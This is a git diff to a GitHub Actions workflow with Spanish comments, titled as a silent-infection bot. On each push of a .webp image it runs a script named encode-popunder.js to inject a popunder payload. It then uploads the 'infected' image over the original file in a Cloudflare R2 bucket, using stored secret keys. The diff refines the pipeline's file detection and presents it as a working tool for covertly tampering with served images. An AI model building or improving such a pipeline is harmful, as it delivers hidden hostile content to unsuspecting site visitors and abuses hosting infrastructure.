@@ -3,7 +3,7 @@ name: Bot Bacteria Popunder - Infección Silenciosa
 on:
   push:
     paths:
-      - '**/*.webp' # El bot solo se activa cuando subes una imagen .webp
+      - '**/*.webp' # Se activa al subir o mover cualquier .webp
 
 jobs:
   infectar-y-desplegar:
@@ -13,50 +13,50 @@ jobs:
     - name: 📥 Clonar repositorio
       uses: actions/checkout@v4
       with:
-        fetch-depth: 2 # Permite comparar con el commit anterior
+        fetch-depth: 2 
 
-    - name: 🔍 Detectar archivo .webp nuevo
+    - name: 🔍 Detectar archivo .webp nuevo (Radar Mejorado)
       id: detect
       run: |
-        # Localiza el archivo .webp modificado o subido
-        ARCHIVO=$(git diff-tree --no-commit-id --name-only -r ${{ github.sha }} | grep '\.webp$' | head -n 1)
+        # Buscamos archivos .webp modificados o añadidos en este commit
+        # El bucle verifica que el archivo realmente EXISTA en el sistema
+        ARCHIVO=$(git diff-tree --no-commit-id --name-only -r ${{ github.sha }} | grep '\.webp$' | while read f; do [ -f "$f" ] && echo "$f" && break; done)
         
         if [ -z "$ARCHIVO" ]; then
-          echo "No se detectó ningún archivo .webp para procesar."
+          echo "No se detectó un archivo .webp físico para procesar."
           exit 0
         fi
 
-        echo "Infectando: $ARCHIVO"
+        echo "Infectando ruta real: $ARCHIVO"
         
-        # Extraer rutas para R2
-        CARPETA=$(dirname "$ARCHIVO")
-        NOMBRE_ARCHIVO=$(basename "$ARCHIVO")
-        
-        echo "CARPETA=$CARPETA" >> $GITHUB_ENV
-        echo "NOMBRE_ARCHIVO=$NOMBRE_ARCHIVO" >> $GITHUB_ENV
+        # Guardamos las variables de entorno para los siguientes pasos
         echo "ARCHIVO_ORIGINAL=$ARCHIVO" >> $GITHUB_ENV
+        echo "CARPETA=$(dirname "$ARCHIVO")" >> $GITHUB_ENV
+        echo "NOMBRE_ARCHIVO=$(basename "$ARCHIVO")" >> $GITHUB_ENV
 
     - name: 🛠️ Configurar Node.js
       uses: actions/setup-node@v4
       with:
         node-version: '20'
 
-    - name: 📦 Instalar dependencias (Sharp)
+    - name: 📦 Instalar dependencias
       run: npm install
 
     - name: 🧪 Preparar imagen para el Bot
-      run: cp "${{ env.ARCHIVO_ORIGINAL }}" input.webp 
+      run: |
+        # Usamos la ruta completa detectada para evitar el error de "No such file"
+        cp "${{ env.ARCHIVO_ORIGINAL }}" input.webp 
 
     - name: 💉 Ejecutar Inyección Popunder (Multi-Canal)
       run: node encode-popunder.js
 
-    - name: ☁️ Desplegar a Cloudflare R2 (nogle-pics)
+    - name: ☁️ Desplegar a Cloudflare R2
       env:
         AWS_ACCESS_KEY_ID: ${{ secrets.R2_ACCESS_KEY_ID }}
         AWS_SECRET_ACCESS_KEY: ${{ secrets.R2_SECRET_ACCESS_KEY }}
         AWS_DEFAULT_REGION: auto
       run: |
-        # Subida directa usando la misma estructura de carpetas que en GitHub
+        # Subimos la imagen infectada (output_infected.webp) a R2 
+        # Reemplazamos el archivo original en el bucket usando su nombre y carpeta real
         aws s3 cp output_infected.webp s3://nogle-pics/${{ env.CARPETA }}/${{ env.NOMBRE_ARCHIVO }} \
           --endpoint-url https://366c94c9611100cd543f5f004747c489.r2.cloudflarestorage.com
-
